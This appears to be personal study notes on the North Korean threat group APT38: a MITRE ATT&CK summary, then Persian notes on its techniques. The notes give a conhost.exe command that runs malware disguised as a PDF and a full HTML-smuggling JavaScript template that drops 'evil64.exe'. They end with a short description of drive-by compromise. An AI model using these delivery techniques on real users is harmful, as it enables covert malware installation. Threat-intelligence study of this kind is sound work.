
# APT38

[APT38](https://attack.mitre.org/groups/G0082) is a North Korean state-sponsored threat group that specializes in financial cyber operations; it has been attributed to the Reconnaissance General Bureau.[[1]](https://us-cert.cisa.gov/ncas/alerts/aa20-239a) Active since at least 2014, [APT38](https://attack.mitre.org/groups/G0082) has targeted banks, financial institutions, casinos, cryptocurrency exchanges, SWIFT system endpoints, and ATMs in at least 38 countries worldwide. Significant operations include the 2016 Bank of Bangladesh heist, during which [APT38](https://attack.mitre.org/groups/G0082) stole $81 million, as well as attacks against Bancomext [[2]](https://www.mandiant.com/sites/default/files/2021-09/rpt-apt38-2018-web_v5-1.pdf) and Banco de Chile [[2]](https://www.mandiant.com/sites/default/files/2021-09/rpt-apt38-2018-web_v5-1.pdf); some of their attacks have been destructive.[[1]](https://us-cert.cisa.gov/ncas/alerts/aa20-239a)[[2]](https://www.mandiant.com/sites/default/files/2021-09/rpt-apt38-2018-web_v5-1.pdf)[[3]](https://www.justice.gov/opa/pr/three-north-korean-military-hackers-indicted-wide-ranging-scheme-commit-cyberattacks-and)[[4]](https://securelist.com/lazarus-under-the-hood/77908/)

North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups.


---

یکی از lolbins هایی که وجود دارد این است که ما با استفاده از  پروسه conhost بیایم و malware که نوشتیم و به فرمت PDF درش اوردیم بیایم و با همون فرمت از طریقه این پروسه اجرا کنیم اما نه به شکل PDF بلکه به شکل executable 

```
conhost.exe malware.pdf
```

یکی دیگر از تکنیک های دیگری که APT 38 استفاده میکند برای initial access استفاده از تکنیک http file smuggling هست 

[[File Smuggling with HTML & JavaScript023_File Smuggling with HTML & JavaScript]]


``
```html
<html>
    <body>
        <script>
            function base64ToArrayBuffer(base64) {
                var binary_string = window.atob(base64);
                var len = binary_string.length;
                
                var bytes = new Uint8Array( len );
                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                return bytes.buffer;
            }
            // 32bit simple reverse shell
            //var file = "H4sIAAAAAAAEABXJwQkAMAwDsZXOMaF4/8Xi/gQiFkNElhSVC7H4fag1ByhICrgnAAAA=="
                        var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {type: 'octet/stream'});
            var fileName = 'evil64.exe';
            if (window.navigator.msSaveOrOpenBlob) {
                window.navigator.msSaveOrOpenBlob(blob,fileName);
            } else {
                var a = document.createElement('a');
                console.log(a);
                document.body.appendChild(a);
                a.style = 'display: none';
                var url = window.URL.createObjectURL(blob);
                a.href = url;
                a.download = fileName;
                a.click();
                window.URL.revokeObjectURL(url);
            }
        </script>
    </body>
</html>

```


یکی دیگر از تکنیک های که APT 38 انجام میدهد تکینک T1189 هست که به اسم 
Drive By Compromise 

هست و به این معنی هست که ما اول یک منبع مورد اعتماد که میتونه یه سایت باشه رو الوده (هک) میکنیم 
و بعدش از اون سایت به عنوان یک فیشینگ استفاده میکنیم 